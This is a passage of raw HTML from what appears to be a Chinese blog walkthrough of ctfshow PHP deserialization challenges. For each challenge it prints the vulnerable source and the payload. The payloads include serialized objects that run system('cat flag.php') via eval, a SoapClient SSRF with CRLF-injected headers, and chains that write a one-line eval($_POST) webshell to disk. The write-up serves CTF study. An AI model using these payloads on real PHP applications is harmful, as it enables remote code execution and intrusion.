class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">    </span><br><span class="line">Cookie user=O%<span class="number">3</span>A%<span class="number">2</span>B11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A%<span class="number">2</span>B8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A%<span class="number">2</span>B8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A%<span class="number">2</span>B8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">27</span>cat+flag.php%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><ul><li>æ€è·¯è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œåªæ˜¯å¤šäº†ä¸€ä¸ªæ­£åˆ™åŒ¹é…</li><li><code>/[oc]:\d+:/i</code><ul><li><code>[oc]</code> åŒ¹é…<code>[]</code>ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦</li><li><code>\d</code> åŒ¹é…0-9çš„ä»»æ„æ•°å­—</li><li><code>+</code> å¤šæ¬¡è¿›è¡ŒåŒ¹é…</li><li><code>i</code> ä¸åŒºåˆ†å¤§å°å†™</li></ul></li><li>æ‰€ä»¥è¯¥æ­£åˆ™è¡¨è¾¾å¼è¡¨è¾¾çš„æ˜¯æ— è®ºå¤§å†™è¿˜æ˜¯å°å†™åŒ¹é…ç¬¦åˆ<code>o/c:æ•°å­—ï¼š</code>çš„å½¢å¼</li><li>åªéœ€è¦åœ¨è¿™å†™æ•°å­—å‰é¢åŠ <code>+</code>å³å¯ç»•è¿‡</li></ul><h1 id="web259-SoapClient"><a href="#web259-SoapClient" class="headerlink" title="web259(SoapClient)"></a>web259(SoapClient)</h1><p><strong>hint</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é¢˜ç›®</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p><code>payload:</code></p><ul><li>æ ¹æ®æç¤ºå‘ç°éœ€è¦åœ¨flag.phpä¸‹æ‰èƒ½è·å–flagï¼Œå°è¯•è®¿é—®flag.phpï¼Œå‘ç°å¦‚ä¸‹ç»“æœ</li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ip.png" alt=""></p><ul><li>åœ¨çœ‹æç¤ºï¼Œå‘ç°æ˜¯ç”¨HTTPå¤´ä¸­çš„â€X-Forwarded-Forâ€å­—æ®µæ¥è·å–IPåœ°å€ã€‚</li><li><code>explode(string $delimiter , string $string)</code> <ul><li><code>$delimiter</code> åˆ†éš”ç¬¦</li><li><code>$string</code> è¾“å…¥çš„å­—ç¬¦ä¸²</li><li>è¿”å›å€¼ä¸ºæ•°ç»„</li></ul></li><li><p><code>array_pop(array)</code></p><ul><li>è¿”å›å€¼ä¸ºarrayçš„æœ€åä¸€ä¸ªå€¼ï¼Œå¦‚æœæ•°ç»„ä¸ºç©ºï¼Œåˆ™è¿”å›NULL</li></ul></li><li><p>æ‰€ä»¥flag.phpå°†ä¼ è¿›å»çš„XFFå­—æ®µä¸­çš„åœ°å€åˆ©ç”¨<code>.</code>åˆ†æˆæ•°ç»„ï¼Œå¹¶åˆ©ç”¨<code>array_pop()</code>å°†åœ°å€çš„æœ€åä¸€ä¸ªå€¼å¼¹å‡ºæ¥ä½œä¸ºipåœ°å€</p></li><li><p>æœ¬é¢˜éœ€è¦ä½¿ç”¨åŸç”Ÿç±»çš„ååºåˆ—åŒ–æ¥å®ç°ï¼Œä½¿ç”¨çš„åŸç”Ÿç±»ä¸º<code>SoapClient</code></p></li><li>å¯ä»¥æ„é€ paylload</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-         urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1&#x27;</span>, <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"><span class="variable">$t</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$client</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$t</span>);</span><br></pre></td></tr></table></figure><h1 id="web260"><a href="#web260" class="headerlink" title="web260()"></a>web260()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?ctfshow=ctfshow_i_love_36D</code></p><ul><li>æ ¹æ®é¢˜ç›®ä¼ å‚å³å¯</li></ul><h1 id="web261-phpå¼±æ¯”è¾ƒ-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"><a href="#web261-phpå¼±æ¯”è¾ƒ-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web261(phpå¼±æ¯”è¾ƒ+è¿œç¨‹å‘½ä»¤æ‰§è¡Œ)"></a>web261(phpå¼±æ¯”è¾ƒ+è¿œç¨‹å‘½ä»¤æ‰§è¡Œ)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?vip=O:<span class="number">10</span>:<span class="string">&quot;ctfshowvip&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;877.php&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[&quot;</span><span class="number">1</span><span class="string">&quot;]);&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;N;&#125; </span><br><span class="line"></span><br><span class="line">è®¿é—®<span class="number">877</span>.php</span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag_is_here&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>çœ‹æºç å¯ä»¥å‘ç°<code>__construct __destruct</code> è¿™ä¸¤ä¸ªé­”æœ¯æ–¹æ³•æ˜¯ä¸€å®šä¼šè§¦å‘çš„</li><li>é€šè¿‡<code>file_put_contents</code>å‡½æ•°å‘ç°å¯ä»¥å†™å…¥æ–‡ä»¶ï¼Œå½“å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬æ—¶ï¼Œå¯ä»¥é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œ</li><li>å°†usernameçš„å€¼æ”¹ä¸º877.phpï¼Œåˆ©ç”¨å¼±æ¯”è¾ƒçš„æ–¹æ³•ç»•è¿‡ifåˆ¤æ–­ï¼Œä½¿æ–‡ä»¶åä¸º877.php</li><li>å°†passwordçš„å€¼æ”¹ä¸ºä¸€å¥è¯æœ¨é©¬</li><li>è®¿é—®877.phpï¼Œå‘ç°å¯ä»¥è®¿é—®ï¼ä¸Šä¼ æˆåŠŸï¼</li></ul><h1 id="web262-å­—ç¬¦ä¸²é€ƒé€¸-å¢åŠ "><a href="#web262-å­—ç¬¦ä¸²é€ƒé€¸-å¢åŠ " class="headerlink" title="web262(å­—ç¬¦ä¸²é€ƒé€¸-å¢åŠ )"></a>web262(å­—ç¬¦ä¸²é€ƒé€¸-å¢åŠ )</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ ¹æ®æ³¨é‡Šé‡Œçš„ä¿¡æ¯å‘ç°è¿˜æœ‰ä¸ªmessage.phpæ–‡ä»¶ï¼Œè®¿é—®</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=<span class="number">1</span>&amp;m=<span class="number">1</span>&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><ul><li>ç»“åˆä¸Šè¿°ä»£ç ï¼Œå‘ç°æˆ‘ä»¬ä¼ è¿›å»çš„æ•°æ®ä¼šå­˜å‚¨åœ¨Cookieå€¼ä¸­ï¼Œä¸”å½“tokenå€¼ä¸ºadminæ‰èƒ½å¾—åˆ°flag</li><li>åˆ©ç”¨å­—ç¬¦ä¸²å¢åŠ çš„æ–¹æ³•ï¼Œæ„é€ payload</li></ul><h1 id="web263-sessionååºåˆ—åŒ–"><a href="#web263-sessionååºåˆ—åŒ–" class="headerlink" title="web263(sessionååºåˆ—åŒ–)"></a>web263(sessionååºåˆ—åŒ–)</h1><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ctfshow.png" alt=""></p><p><code>payload: è®¿é—®/log-1.php    1=system(&#39;cat flag.php&#39;);</code></p><ul><li>è¿›å»ä¹‹åäººéƒ½å‚»äº†ï¼ˆä»£ç å‘¢ï¼Ÿï¼Ÿï¼‰</li><li>æ²¡æœ‰æ€è·¯ï¼Œå…ˆæ‰«ä¸‹ç›®å½•å§</li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kali.png" alt=""></p><ul><li>å‘ç°æœ‰<code>www.zip</code>æ–‡ä»¶ï¼Œä¸‹è½½ï¼Œæ‰“å¼€ä¹‹åä¸€ä¸ªä¸€ä¸ªæŸ¥çœ‹ï¼Œå‘ç°è¿™æ˜¯ä¸ªå…³äºsessionçš„ååºåˆ—åŒ–</li></ul><p><strong>index.php</strong></p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/session_01.png" alt=""></p><p>æ˜¾ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡cookieä¸­çš„limitæ§åˆ¶sessionä¸­çš„limitï¼Œå†™å…¥æ–¹å¼æ˜¯php_serialize</p><p><strong>check.php</strong></p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/session_02.png" alt=""></p><p>æ— è®ºæˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼Œéƒ½ä¼šé‡ç½®sessionï¼Œè¿™æ˜¯æˆ‘ä»¬ä¸æƒ³çœ‹åˆ°çš„ã€‚æ‰€ä»¥ä¸èƒ½è®¿é—®check.php</p><p><strong>inc.php</strong></p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/session.png" alt=""></p><p>çœ‹åˆ°äº†Userç±»ï¼Œè¿™ä¸ªç±»çš„__destructæ–¹æ³•æ˜¯å…³é”®æ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å†™é©¬ï¼Œusernameæ˜¯æ–‡ä»¶åï¼Œpasswordæ˜¯å†…å®¹ï¼Œå®Œå…¨å¯æ§</p><ul><li>å³å¯æ„é€ payload</li></ul><blockquote><p>åŸç†ï¼šåœ¨cookieå†™å…¥åï¼Œsessionåº”è¯¥æ˜¯è¿™æ ·çš„å½¢å¼ï¼š</p><p>a:1:{s:5:â€limitâ€;s:length:â€å¯æ§çš„å†™å…¥éƒ¨åˆ†â€}</p><p>ç„¶åï¼Œæˆ‘ä»¬æƒ³è¦åœ¨inc.phpè¯»å–çš„æ—¶å€™å¾—åˆ°Userç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š</p><p>O:4:â€Userâ€:3:{s:8:â€usernameâ€;s:5:â€1.phpâ€;s:8:â€passwordâ€;s:25:â€&lt;?php @eval($_POST[1]);?&gt;â€;s:6:â€statusâ€;N;}</p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨Oçš„å‰é¢åŠ ä¸Š<code>|</code>ï¼Œå°±å¯ä»¥æŠŠå‰é¢éƒ½è§†ä¸ºç±»åã€‚åŒæ—¶ï¼Œååºåˆ—åŒ–ä¼šåœ¨é‡åˆ°ç¬¬ä¸€ä¸ª<code>&#125;</code>ä¹‹åç»ˆæ­¢ï¼Œä¸ä¼šç»§ç»­è¯»å–åé¢çš„å†…å®¹ï¼Œæ‰€ä»¥ä¸ç”¨æ‹…å¿ƒåé¢çš„<code>&quot;&#125;</code>ä¼šå½±å“ååºåˆ—åŒ–ã€‚å¯æ§çš„éƒ¨åˆ†åªéœ€è¦ä¼ å…¥Userç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²å†base64ç¼–ç å³å¯</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNToiPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span><br></pre></td></tr></table></figure><p>å°†cookieä¸­çš„limitæ”¹æˆè¿™ä¸ªå€¼ï¼Œè®¿é—®index.phpï¼Œå†è®¿é—®inc/inc.phpï¼Œæœ€åè®¿é—®å†™å…¥çš„shellå³å¯</p><h1 id="web264-session"><a href="#web264-session" class="headerlink" title="web264(session)"></a>web264(session)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span 